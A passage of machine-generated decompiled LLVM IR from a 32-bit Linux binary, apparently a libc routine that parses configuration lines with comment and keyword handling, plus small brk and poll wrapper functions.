dec_label_pc_8055069:                             ; preds = %dec_label_pc_8055069.lr.ph, %dec_label_pc_805505e
  %v6_805505f58 = phi i32 [ %v6_805505f53, %dec_label_pc_8055069.lr.ph ], [ %v6_805505f, %dec_label_pc_805505e ]
  %v2_805505f57 = phi i8 [ %v2_805505f50, %dec_label_pc_8055069.lr.ph ], [ %v2_805505f, %dec_label_pc_805505e ]
  %v1_805505f56 = phi i8* [ %v1_805505f49, %dec_label_pc_8055069.lr.ph ], [ %v1_805505f, %dec_label_pc_805505e ]
  %v0_805505e55 = phi i32 [ %v0_805505f.pre, %dec_label_pc_8055069.lr.ph ], [ %v1_805505e, %dec_label_pc_805505e ]
  %v2_8055069 = sext i8 %v2_805505f57 to i32
  store i32 %v2_8055069, i32* @edx, align 4
  store i32 %v0_805506c.pre, i32* @eax, align 4
  %v2_8055071 = mul nsw i32 %v2_8055069, 2
  %v3_8055071 = add i32 %v0_805506c.pre, %v2_8055071
  %v4_8055071 = inttoptr i32 %v3_8055071 to i8*
  %v5_8055071 = load i8, i8* %v4_8055071, align 1
  %v6_8055071 = and i8 %v5_8055071, 32
  %v7_8055071 = icmp eq i8 %v6_8055071, 0
  %v1_8055075 = icmp eq i1 %v7_8055071, false
  br i1 %v1_8055075, label %dec_label_pc_805505e, label %dec_label_pc_8055077

dec_label_pc_8055077:                             ; preds = %dec_label_pc_8055069
  %v10_8055077 = icmp eq i8 %v2_805505f57, 10
  br i1 %v10_8055077, label %dec_label_pc_80551d2.backedge, label %dec_label_pc_8055080

dec_label_pc_80551d2.backedge:                    ; preds = %dec_label_pc_805505f.preheader, %dec_label_pc_805505e, %dec_label_pc_8055198, %dec_label_pc_80551c7, %dec_label_pc_805519f, %dec_label_pc_8055077, %dec_label_pc_8055080, %dec_label_pc_8055151
  %v0_80551d2 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_80551d9, i32* @ebx, align 4
  %v3_80551de = call i32 @function_805581c(i32 %v2_80551d9, i32 128, i32 %v0_80551d2)
  store i32 %v3_80551de, i32* @eax, align 4
  %v1_80551e6 = icmp eq i32 %v3_80551de, 0
  %v1_80551e8 = icmp eq i1 %v1_80551e6, false
  br i1 %v1_80551e8, label %dec_label_pc_805505f.preheader, label %dec_label_pc_80551ee

dec_label_pc_8055080:                             ; preds = %dec_label_pc_8055077
  %v10_8055088 = icmp eq i8 %v2_805505f57, 35
  %v1_805508b = icmp eq i1 %v10_8055088, false
  br i1 %v1_805508b, label %dec_label_pc_80550dc.preheader, label %dec_label_pc_80551d2.backedge

dec_label_pc_80550dc.preheader:                   ; preds = %dec_label_pc_8055080
  %v2_80550dc4 = load i8, i8* %v1_805505f56, align 1
  %v3_80550dc5 = icmp eq i8 %v2_80550dc4, 0
  br i1 %v3_80550dc5, label %dec_label_pc_80550e8, label %dec_label_pc_80550e1

dec_label_pc_8055092:                             ; preds = %dec_label_pc_80550e1
  store i32 %stack_var_-196.011, i32* @eax, align 4
  %v1_8055096 = load i32, i32* @esp, align 4
  %v3_8055096 = mul nuw nsw i32 %stack_var_-196.011, 4
  %v4_8055096 = add nuw nsw i32 %v3_8055096, 152
  %v5_8055096 = add i32 %v4_8055096, %v1_8055096
  %v6_8055096 = inttoptr i32 %v5_8055096 to i32*
  store i32 %v0_8055096, i32* %v6_8055096, align 4
  %v0_80550a0.pre = load i32, i32* @ebx, align 4
  %v4_80550a0.pre = load i32, i32* @ecx, align 4
  %v1_80550a059 = inttoptr i32 %v0_80550a0.pre to i8*
  %v2_80550a060 = load i8, i8* %v1_80550a059, align 1
  %v3_80550a061 = zext i8 %v2_80550a060 to i32
  %v5_80550a062 = and i32 %v4_80550a0.pre, -256
  %v6_80550a063 = or i32 %v3_80550a061, %v5_80550a062
  %v4_80550a264 = icmp eq i8 %v2_80550a060, 0
  br i1 %v4_80550a264, label %dec_label_pc_80550bf.preheader, label %dec_label_pc_80550a6.lr.ph

dec_label_pc_80550a6.lr.ph:                       ; preds = %dec_label_pc_8055092
  %v0_80550a9.pre = load i32, i32* @global_var_805d61c, align 4
  br label %dec_label_pc_80550a6

dec_label_pc_805509f:                             ; preds = %dec_label_pc_80550b4
  %v1_805509f = add i32 %v0_805509f65, 1
  store i32 %v1_805509f, i32* @ebx, align 4
  %v1_80550a0 = inttoptr i32 %v1_805509f to i8*
  %v2_80550a0 = load i8, i8* %v1_80550a0, align 1
  %v3_80550a0 = zext i8 %v2_80550a0 to i32
  %v5_80550a0 = and i32 %v6_80550a067, -256
  %v6_80550a0 = or i32 %v3_80550a0, %v5_80550a0
  %v4_80550a2 = icmp eq i8 %v2_80550a0, 0
  br i1 %v4_80550a2, label %dec_label_pc_80550bf.preheader, label %dec_label_pc_80550a6

dec_label_pc_80550a6:                             ; preds = %dec_label_pc_80550a6.lr.ph, %dec_label_pc_805509f
  %v6_80550a067 = phi i32 [ %v6_80550a063, %dec_label_pc_80550a6.lr.ph ], [ %v6_80550a0, %dec_label_pc_805509f ]
  %v2_80550a066 = phi i8 [ %v2_80550a060, %dec_label_pc_80550a6.lr.ph ], [ %v2_80550a0, %dec_label_pc_805509f ]
  %v0_805509f65 = phi i32 [ %v0_80550a0.pre, %dec_label_pc_80550a6.lr.ph ], [ %v1_805509f, %dec_label_pc_805509f ]
  %v2_80550a6 = sext i8 %v2_80550a066 to i32
  store i32 %v2_80550a6, i32* @edx, align 4
  store i32 %v0_80550a9.pre, i32* @eax, align 4
  %v2_80550ae = mul nsw i32 %v2_80550a6, 2
  %v3_80550ae = add i32 %v0_80550a9.pre, %v2_80550ae
  %v4_80550ae = inttoptr i32 %v3_80550ae to i8*
  %v5_80550ae = load i8, i8* %v4_80550ae, align 1
  %v6_80550ae = and i8 %v5_80550ae, 32
  %v7_80550ae = icmp eq i8 %v6_80550ae, 0
  %v1_80550b2 = icmp eq i1 %v7_80550ae, false
  br i1 %v1_80550b2, label %dec_label_pc_80550bf.preheader, label %dec_label_pc_80550b4

dec_label_pc_80550b4:                             ; preds = %dec_label_pc_80550a6
  %v10_80550b4 = icmp eq i8 %v2_80550a066, 10
  %v1_80550b7 = icmp eq i1 %v10_80550b4, false
  br i1 %v1_80550b7, label %dec_label_pc_805509f, label %dec_label_pc_80550bf.preheader

dec_label_pc_80550bf.preheader:                   ; preds = %dec_label_pc_80550b4, %dec_label_pc_805509f, %dec_label_pc_80550a6, %dec_label_pc_8055092
  %v0_805509f.lcssa = phi i32 [ %v0_80550a0.pre, %dec_label_pc_8055092 ], [ %v0_805509f65, %dec_label_pc_80550a6 ], [ %v1_805509f, %dec_label_pc_805509f ], [ %v0_805509f65, %dec_label_pc_80550b4 ]
  %v6_80550a0.lcssa = phi i32 [ %v6_80550a063, %dec_label_pc_8055092 ], [ %v6_80550a067, %dec_label_pc_80550a6 ], [ %v6_80550a0, %dec_label_pc_805509f ], [ %v6_80550a067, %dec_label_pc_80550b4 ]
  %v1_80550bf73 = inttoptr i32 %v0_805509f.lcssa to i8*
  %v2_80550bf74 = load i8, i8* %v1_80550bf73, align 1
  %v3_80550bf75 = zext i8 %v2_80550bf74 to i32
  %v5_80550bf76 = and i32 %v6_80550a0.lcssa, -256
  %v6_80550bf77 = or i32 %v3_80550bf75, %v5_80550bf76
  store i32 %v6_80550bf77, i32* @ecx, align 4
  %v4_80550c178 = icmp eq i8 %v2_80550bf74, 0
  br i1 %v4_80550c178, label %dec_label_pc_80550d8, label %dec_label_pc_80550c5

dec_label_pc_80550bb:                             ; preds = %dec_label_pc_80550d3, %dec_label_pc_80550c5
  store i8 0, i8* %v1_80550bf80, align 1
  %v0_80550be = load i32, i32* @ebx, align 4
  %v1_80550be = add i32 %v0_80550be, 1
  store i32 %v1_80550be, i32* @ebx, align 4
  %v4_80550bf.pre = load i32, i32* @ecx, align 4
  %v1_80550bf = inttoptr i32 %v1_80550be to i8*
  %v2_80550bf = load i8, i8* %v1_80550bf, align 1
  %v3_80550bf = zext i8 %v2_80550bf to i32
  %v5_80550bf = and i32 %v4_80550bf.pre, -256
  %v6_80550bf = or i32 %v3_80550bf, %v5_80550bf
  store i32 %v6_80550bf, i32* @ecx, align 4
  %v4_80550c1 = icmp eq i8 %v2_80550bf, 0
  br i1 %v4_80550c1, label %dec_label_pc_80550d8, label %dec_label_pc_80550c5

dec_label_pc_80550c5:                             ; preds = %dec_label_pc_80550bf.preheader, %dec_label_pc_80550bb
  %v2_80550bf81 = phi i8 [ %v2_80550bf, %dec_label_pc_80550bb ], [ %v2_80550bf74, %dec_label_pc_80550bf.preheader ]
  %v1_80550bf80 = phi i8* [ %v1_80550bf, %dec_label_pc_80550bb ], [ %v1_80550bf73, %dec_label_pc_80550bf.preheader ]
  %v0_80550dc79 = phi i32 [ %v1_80550be, %dec_label_pc_80550bb ], [ %v0_805509f.lcssa, %dec_label_pc_80550bf.preheader ]
  %v2_80550c5 = sext i8 %v2_80550bf81 to i32
  store i32 %v2_80550c5, i32* @edx, align 4
  %v0_80550c8 = load i32, i32* @global_var_805d61c, align 4
  store i32 %v0_80550c8, i32* @eax, align 4
  %v2_80550cd = mul nsw i32 %v2_80550c5, 2
  %v3_80550cd = add i32 %v0_80550c8, %v2_80550cd
  %v4_80550cd = inttoptr i32 %v3_80550cd to i8*
  %v5_80550cd = load i8, i8* %v4_80550cd, align 1
  %v6_80550cd = and i8 %v5_80550cd, 32
  %v7_80550cd = icmp eq i8 %v6_80550cd, 0
  %v1_80550d1 = icmp eq i1 %v7_80550cd, false
  br i1 %v1_80550d1, label %dec_label_pc_80550bb, label %dec_label_pc_80550d3

dec_label_pc_80550d3:                             ; preds = %dec_label_pc_80550c5
  %v10_80550d3 = icmp eq i8 %v2_80550bf81, 10
  br i1 %v10_80550d3, label %dec_label_pc_80550bb, label %dec_label_pc_80550d8

dec_label_pc_80550d8:                             ; preds = %dec_label_pc_80550bb, %dec_label_pc_80550d3, %dec_label_pc_80550bf.preheader
  %v0_80550dc.lcssa = phi i32 [ %v0_805509f.lcssa, %dec_label_pc_80550bf.preheader ], [ %v0_80550dc79, %dec_label_pc_80550d3 ], [ %v1_80550be, %dec_label_pc_80550bb ]
  %v1_80550bf.lcssa = phi i8* [ %v1_80550bf73, %dec_label_pc_80550bf.preheader ], [ %v1_80550bf80, %dec_label_pc_80550d3 ], [ %v1_80550bf, %dec_label_pc_80550bb ]
  %v4_80550d8 = add nuw nsw i32 %stack_var_-196.011, 1
  %v2_80550dc = load i8, i8* %v1_80550bf.lcssa, align 1
  %v3_80550dc = icmp eq i8 %v2_80550dc, 0
  br i1 %v3_80550dc, label %dec_label_pc_80550e8, label %dec_label_pc_80550e1

dec_label_pc_80550e1:                             ; preds = %dec_label_pc_80550dc.preheader, %dec_label_pc_80550d8
  %v0_8055096 = phi i32 [ %v0_80550dc.lcssa, %dec_label_pc_80550d8 ], [ %v0_805505e55, %dec_label_pc_80550dc.preheader ]
  %stack_var_-196.011 = phi i32 [ %v4_80550d8, %dec_label_pc_80550d8 ], [ 0, %dec_label_pc_80550dc.preheader ]
  %v7_80550e6 = icmp sgt i32 %stack_var_-196.011, 4
  br i1 %v7_80550e6, label %dec_label_pc_80550e8, label %dec_label_pc_8055092

dec_label_pc_80550e8:                             ; preds = %dec_label_pc_80550d8, %dec_label_pc_80550e1, %dec_label_pc_80550dc.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_80550dc.preheader ], [ %v4_80550d8, %dec_label_pc_80550d8 ], [ %stack_var_-196.011, %dec_label_pc_80550e1 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_80550ef = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805c947.403 to i32), i32* %stack_var_-216, align 4
  %v5_80550f7 = call i32 @function_8055b14(i8* %v4_80550f7, i32 ptrtoint ([11 x i8]* @global_var_805c947.403 to i32), i32 %v0_80550ef, i32 %v0_80550ef)
  store i32 %v5_80550f7, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_8055104 = icmp eq i32 %v5_80550f7, 0
  br i1 %v1_8055104, label %dec_label_pc_805512c.preheader, label %dec_label_pc_805513d

dec_label_pc_805512c.preheader:                   ; preds = %dec_label_pc_80550e8
  %v5_805513087 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_805513087, label %dec_label_pc_8055132.lr.ph, label %dec_label_pc_805513d

dec_label_pc_8055132.lr.ph:                       ; preds = %dec_label_pc_805512c.preheader
  %v0_8055132.pre = load i32, i32* @global_var_8063f74.338, align 4
  br label %dec_label_pc_8055132

dec_label_pc_805510a:                             ; preds = %dec_label_pc_8055132
  %v2_805510d = mul i32 %v1_805510d88, 4
  %v4_805510d = add i32 %v2_805510d, %v3_805510d
  %v5_805510d = inttoptr i32 %v4_805510d to i32*
  %v6_805510d = load i32, i32* %v5_805510d, align 4
  %v1_8055114 = call i32 @function_8055bfc(i32 %v6_805510d)
  %v0_8055119 = load i32, i32* @esi, align 4
  %v1_8055119 = add i32 %v0_8055119, 1
  store i32 %v1_8055119, i32* @esi, align 4
  %v1_805511a = load i32, i32* @ebx, align 4
  %v2_805511a = mul i32 %v1_805511a, 4
  %v3_805511a = add i32 %v2_805511a, 134627176
  %v4_805511a = inttoptr i32 %v3_805511a to i32*
  store i32 %v1_8055114, i32* %v4_805511a, align 4
  %v0_8055121 = load i32, i32* @ebx, align 4
  %v1_8055121 = add i32 %v0_8055121, 1
  store i32 %v1_8055121, i32* @eax, align 4
  store i32 %v1_8055121, i32* @global_var_8063f74.338, align 4
  %v0_805512c.pre = load i32, i32* @esi, align 4
  %v5_8055130 = icmp slt i32 %v0_805512c.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8055130, label %dec_label_pc_8055132, label %dec_label_pc_805513d

dec_label_pc_8055132:                             ; preds = %dec_label_pc_8055132.lr.ph, %dec_label_pc_805510a
  %v0_8055132 = phi i32 [ %v0_8055132.pre, %dec_label_pc_8055132.lr.ph ], [ %v1_8055121, %dec_label_pc_805510a ]
  %v1_805510d88 = phi i32 [ 1, %dec_label_pc_8055132.lr.ph ], [ %v0_805512c.pre, %dec_label_pc_805510a ]
  store i32 %v0_8055132, i32* @ebx, align 4
  %v7_805513b = icmp sgt i32 %v0_8055132, 2
  br i1 %v7_805513b, label %dec_label_pc_805513d, label %dec_label_pc_805510a

dec_label_pc_805513d:                             ; preds = %dec_label_pc_805512c.preheader, %dec_label_pc_805510a, %dec_label_pc_8055132, %dec_label_pc_80550e8
  %v0_805513d = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805c952.404 to i32), i32* %stack_var_-216, align 4
  %v0_8055144 = load i32, i32* @edi, align 4
  %v4_8055145 = inttoptr i32 %v0_8055144 to i8*
  %v5_8055145 = call i32 @function_8055b14(i8* %v4_8055145, i32 ptrtoint ([7 x i8]* @global_var_805c952.404 to i32), i32 %v0_805513d, i32 %v0_805513d)
  store i32 %v5_8055145, i32* @eax, align 4
  %v1_805514d = icmp eq i32 %v5_8055145, 0
  br i1 %v1_805514d, label %dec_label_pc_805518f.preheader, label %dec_label_pc_8055151

dec_label_pc_8055151:                             ; preds = %dec_label_pc_805513d
  %v0_8055151 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805c959.405 to i32), i32* %stack_var_-216, align 4
  %v0_8055158 = load i32, i32* @edi, align 4
  %v4_8055159 = inttoptr i32 %v0_8055158 to i8*
  %v5_8055159 = call i32 @function_8055b14(i8* %v4_8055159, i32 ptrtoint ([7 x i8]* @global_var_805c959.405 to i32), i32 %v0_8055151, i32 %v0_8055151)
  %v1_8055161 = icmp eq i32 %v5_8055159, 0
  br i1 %v1_8055161, label %dec_label_pc_805518f.preheader, label %dec_label_pc_80551d2.backedge

dec_label_pc_805518f.preheader:                   ; preds = %dec_label_pc_805513d, %dec_label_pc_8055151
  %v0_805518f89 = load i32, i32* @global_var_8063f78.398, align 8
  %tmp4391 = icmp slt i32 %v0_805518f89, 1
  %tmp4492 = icmp eq i1 %tmp4391, false
  br i1 %tmp4492, label %dec_label_pc_8055167, label %dec_label_pc_8055198

dec_label_pc_8055167:                             ; preds = %dec_label_pc_805518f.preheader, %dec_label_pc_8055167.dec_label_pc_8055167_crit_edge
  %v0_805518f93 = phi i32 [ %v0_805518f, %dec_label_pc_8055167.dec_label_pc_8055167_crit_edge ], [ %v0_805518f89, %dec_label_pc_805518f.preheader ]
  %v1_8055167 = add i32 %v0_805518f93, -1
  store i32 %v1_8055167, i32* @global_var_8063f78.398, align 8
  %v1_8055170 = mul i32 %v1_8055167, 4
  %v2_8055170 = add i32 %v1_8055170, 134627160
  %v3_8055170 = inttoptr i32 %v2_8055170 to i32*
  %v4_8055170 = load i32, i32* %v3_8055170, align 4
  %v1_8055177 = call i32 @function_8052915(i32 %v4_8055170)
  %v0_805517c = load i32, i32* @global_var_8063f78.398, align 8
  %v1_8055184 = mul i32 %v0_805517c, 4
  %v2_8055184 = add i32 %v1_8055184, ptrtoint (i32* @global_var_8063f58.406 to i32)
  %v3_8055184 = inttoptr i32 %v2_8055184 to i32*
  store i32 0, i32* %v3_8055184, align 4
  %v0_805518f = load i32, i32* @global_var_8063f78.398, align 8
  %tmp43 = icmp slt i32 %v0_805518f, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_8055167.dec_label_pc_8055167_crit_edge, label %dec_label_pc_8055198

dec_label_pc_8055167.dec_label_pc_8055167_crit_edge: ; preds = %dec_label_pc_8055167
  br label %dec_label_pc_8055167

dec_label_pc_8055198:                             ; preds = %dec_label_pc_8055167, %dec_label_pc_805518f.preheader
  %v0_805518f.lcssa = phi i32 [ %v0_805518f89, %dec_label_pc_805518f.preheader ], [ %v0_805518f, %dec_label_pc_8055167 ]
  store i32 1, i32* @esi, align 4
  %v5_80551c596 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_80551c596, label %dec_label_pc_80551c7, label %dec_label_pc_80551d2.backedge

dec_label_pc_805519f:                             ; preds = %dec_label_pc_80551c7
  %v2_80551a2 = mul i32 %v1_80551a298, 4
  %v4_80551a2 = add i32 %v2_80551a2, %v3_805510d
  %v5_80551a2 = inttoptr i32 %v4_80551a2 to i32*
  %v6_80551a2 = load i32, i32* %v5_80551a2, align 4
  %v1_80551a9 = call i32 @function_8055bfc(i32 %v6_80551a2)
  %v0_80551ae = load i32, i32* @esi, align 4
  %v1_80551ae = add i32 %v0_80551ae, 1
  store i32 %v1_80551ae, i32* @esi, align 4
  %v1_80551af = load i32, i32* @ebx, align 4
  %v2_80551af = mul i32 %v1_80551af, 4
  %v3_80551af = add i32 %v2_80551af, 134627160
  %v4_80551af = inttoptr i32 %v3_80551af to i32*
  store i32 %v1_80551a9, i32* %v4_80551af, align 4
  %v0_80551b6 = load i32, i32* @ebx, align 4
  %v1_80551b6 = add i32 %v0_80551b6, 1
  store i32 %v1_80551b6, i32* @global_var_8063f78.398, align 8
  %v0_80551c1.pre = load i32, i32* @esi, align 4
  %v5_80551c5 = icmp slt i32 %v0_80551c1.pre, %stack_var_-196.0.lcssa
  br i1 %v5_80551c5, label %dec_label_pc_80551c7, label %dec_label_pc_80551d2.backedge

dec_label_pc_80551c7:                             ; preds = %dec_label_pc_8055198, %dec_label_pc_805519f
  %v1_80551a298 = phi i32 [ %v0_80551c1.pre, %dec_label_pc_805519f ], [ 1, %dec_label_pc_8055198 ]
  %v0_80551c797 = phi i32 [ %v1_80551b6, %dec_label_pc_805519f ], [ %v0_805518f.lcssa, %dec_label_pc_8055198 ]
  store i32 %v0_80551c797, i32* @ebx, align 4
  %v7_80551d0 = icmp sgt i32 %v0_80551c797, 3
  br i1 %v7_80551d0, label %dec_label_pc_80551d2.backedge, label %dec_label_pc_805519f

dec_label_pc_805505f.preheader:                   ; preds = %dec_label_pc_805505f.preheader.lr.ph, %dec_label_pc_80551d2.backedge
  %v0_805505f.pre = load i32, i32* @ebx, align 4
  %v4_805505f.pre = load i32, i32* @ecx, align 4
  %v1_805505f49 = inttoptr i32 %v0_805505f.pre to i8*
  %v2_805505f50 = load i8, i8* %v1_805505f49, align 1
  %v3_805505f51 = zext i8 %v2_805505f50 to i32
  %v5_805505f52 = and i32 %v4_805505f.pre, -256
  %v6_805505f53 = or i32 %v3_805505f51, %v5_805505f52
  store i32 %v6_805505f53, i32* @ecx, align 4
  %v4_805506154 = icmp eq i8 %v2_805505f50, 0
  br i1 %v4_805506154, label %dec_label_pc_80551d2.backedge, label %dec_label_pc_8055069.lr.ph

dec_label_pc_8055069.lr.ph:                       ; preds = %dec_label_pc_805505f.preheader
  %v0_805506c.pre = load i32, i32* @global_var_805d61c, align 4
  br label %dec_label_pc_8055069

dec_label_pc_80551ee:                             ; preds = %dec_label_pc_80551d2.backedge, %dec_label_pc_80551d2.preheader
  %v0_80551f1 = load i32, i32* @ebp, align 4
  %v1_80551f2 = inttoptr i32 %v0_80551f1 to i16*
  %v2_80551f2 = call i32 @function_80552ec(i16* %v1_80551f2)
  br label %dec_label_pc_8055207

dec_label_pc_80551fc:                             ; preds = %dec_label_pc_805503b
  %v0_80551fc = call i32 @function_8053b78()
  %v1_8055201 = inttoptr i32 %v0_80551fc to i32*
  store i32 3, i32* %v1_8055201, align 4
  br label %dec_label_pc_8055207

dec_label_pc_8055207:                             ; preds = %dec_label_pc_8054fe0, %dec_label_pc_80551ee, %dec_label_pc_80551fc
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_8054ff4, i32* @eax, align 4
  %v2_8055213 = call i32 @function_80535d2(i32 %v2_8054ff4, i32 1)
  store i32 %v0_8054fe0, i32* @ebp, align 4
  ret i32 %v2_8055213

; uselistorder directives
  uselistorder i32 %v0_805506c.pre, { 1, 0 }
  uselistorder i32 %v6_805505f53, { 1, 0 }
  uselistorder i8 %v2_805505f50, { 1, 2, 0 }
  uselistorder i8* %v1_805505f49, { 1, 0 }
  uselistorder i32 %v0_805505f.pre, { 1, 0 }
  uselistorder i32 %v0_805518f, { 0, 2, 1 }
  uselistorder i32 %v1_8055167, { 1, 0 }
  uselistorder i32 %v0_8055132, { 1, 0 }
  uselistorder i32 %v0_805512c.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.011, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_80550c5, { 1, 0 }
  uselistorder i8 %v2_80550bf81, { 1, 0 }
  uselistorder i32 %v2_80550a6, { 1, 0 }
  uselistorder i8 %v2_80550a066, { 1, 0 }
  uselistorder i32 %v1_805509f, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8055069, { 1, 0 }
  uselistorder i32 %v1_805505e, { 1, 0, 2 }
  uselistorder i32 %v2_80551d9, { 2, 3, 0, 1 }
  uselistorder i32 %v2_8055047, { 1, 0 }
  uselistorder i32 %v2_8055029, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 1, 3, 4, 5, 2, 0, 6, 7, 9, 8 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @function_8053b78, { 2, 5, 4, 3, 1, 0, 6 }
  uselistorder i32* @global_var_8063f78.398, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 2, 1, 3, 4, 0 }
  uselistorder i32 164, { 2, 1, 0 }
  uselistorder i32* @global_var_8063f74.338, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805d888.337 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_8055207, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805505f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80551c7, { 1, 0 }
  uselistorder label %dec_label_pc_8055167, { 1, 0 }
  uselistorder label %dec_label_pc_805518f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805513d, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8055132, { 1, 0 }
  uselistorder label %dec_label_pc_80550e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80550e1, { 1, 0 }
  uselistorder label %dec_label_pc_80550d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80550c5, { 1, 0 }
  uselistorder label %dec_label_pc_80550bf.preheader, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_80550a6, { 1, 0 }
  uselistorder label %dec_label_pc_80551d2.backedge, { 0, 3, 4, 2, 7, 6, 5, 1 }
  uselistorder label %dec_label_pc_80551d2.preheader, { 1, 0 }
}

define i32 @function_8055224(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8055224:
  %v9_8055247 = inttoptr i32 %arg3 to i32*
  %v10_8055247 = call i32 @function_805645d(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_8055247, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_8055247
}

define i32 @function_8055250(i32 %arg1) local_unnamed_addr {
dec_label_pc_8055250:
  %v0_8055253 = call i32 @function_8050214()
  %v0_8055258 = load i32, i32* @edx, align 4
  %v4_805525f = call i32 @function_80502b0(i32 %v0_8055253, i32 %arg1, i32 %v0_8055258, i32 %v0_8055258)
  ret i32 %v4_805525f
}

define i32 @function_8055268() local_unnamed_addr {
dec_label_pc_8055268:
  %v0_8055268 = load i32, i32* @eax, align 4
  %v1_8055268 = add i32 %v0_8055268, 28
  %v2_8055268 = inttoptr i32 %v1_8055268 to i32*
  %v3_8055268 = load i32, i32* %v2_8055268, align 4
  store i32 %v3_8055268, i32* @global_var_8063f7c.407, align 4
  %v1_8055271 = add i32 %v0_8055268, 44
  %v2_8055271 = inttoptr i32 %v1_8055271 to i32*
  %v3_8055271 = load i32, i32* %v2_8055271, align 4
  store i32 %v3_8055271, i32* @global_var_8063f80.408, align 128
  ret i32 %v3_8055271
}

define i32 @function_805527c(i32 %arg1) local_unnamed_addr {
dec_label_pc_805527c:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805527c = load i32, i32* @ebx, align 4
  store i32 %v0_805527c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805528f = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805528f, i32* @global_var_8063b44.385, align 4
  %v7_805529a = icmp ult i32 %v1_805528f, %arg1
  %v1_805529c = icmp eq i1 %v7_805529a, false
  br i1 %v1_805529c, label %dec_label_pc_80552ac, label %dec_label_pc_805529e

dec_label_pc_805529e:                             ; preds = %dec_label_pc_805527c
  %v1_805529e = call i32 @function_8050568(i32 %v0_805527c)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80552a6 = inttoptr i32 %v1_805529e to i32*
  store i32 12, i32* %v1_80552a6, align 4
  %v0_80552ac.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_80552b0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80552ac

dec_label_pc_80552ac:                             ; preds = %dec_label_pc_805527c, %dec_label_pc_805529e
  %v2_80552b0 = phi i32 [ %v0_805527c, %dec_label_pc_805527c ], [ %v2_80552b0.pre, %dec_label_pc_805529e ]
  %v0_80552ac = phi i32 [ 0, %dec_label_pc_805527c ], [ %v0_80552ac.pre, %dec_label_pc_805529e ]
  store i32 %v2_80552b0, i32* @ebx, align 4
  ret i32 %v0_80552ac

; uselistorder directives
  uselistorder i32 %v1_805528f, { 1, 0 }
  uselistorder i32* @global_var_8063b44.385, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80552ac, { 1, 0 }
}

define i32 @function_80552b4() local_unnamed_addr {
dec_label_pc_80552b4:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80552b4 = load i32, i32* @edi, align 4
  store i32 %v0_80552b4, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_80552c4 = load i32, i32* @ebx, align 4
  %v1_80552c5 = inttoptr i32 %tmp4 to %pollfd*
  %v5_80552cc = call i32 @poll(%pollfd* %v1_80552c5, i32 %tmp3, i32 %tmp)
  store i32 %v0_80552c4, i32* @ebx, align 4
  store i32 %v5_80552cc, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v5_80552cc, -4095
  br i1 %tmp11, label %dec_label_pc_80552e4, label %dec_label_pc_80552d8

dec_label_pc_80552d8:                             ; preds = %dec_label_pc_80552b4
  %v1_80552d8 = call i32 @function_8050568(i32 %v0_80552c4)
  %v0_80552dd = load i32, i32* %edi.global-to-local, align 4
  %v1_80552dd = sub i32 0, %v0_80552dd
  %v2_80552df = inttoptr i32 %v1_80552d8 to i32*
  store i32 %v1_80552dd, i32* %v2_80552df, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80552e8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80552e4

dec_label_pc_80552e4:                             ; preds = %dec_label_pc_80552b4, %dec_label_pc_80552d8
  %v2_80552e8 = phi i32 [ %v0_80552b4, %dec_label_pc_80552b4 ], [ %v2_80552e8.pre, %dec_label_pc_80552d8 ]
  %v0_80552e4 = phi i32 [ %v5_80552cc, %dec_label_pc_80552b4 ], [ -1, %dec_label_pc_80552d8 ]
  store i32 %v2_80552e8, i32* @edi, align 4
  ret i32 %v0_80552e4

; uselistorder directives
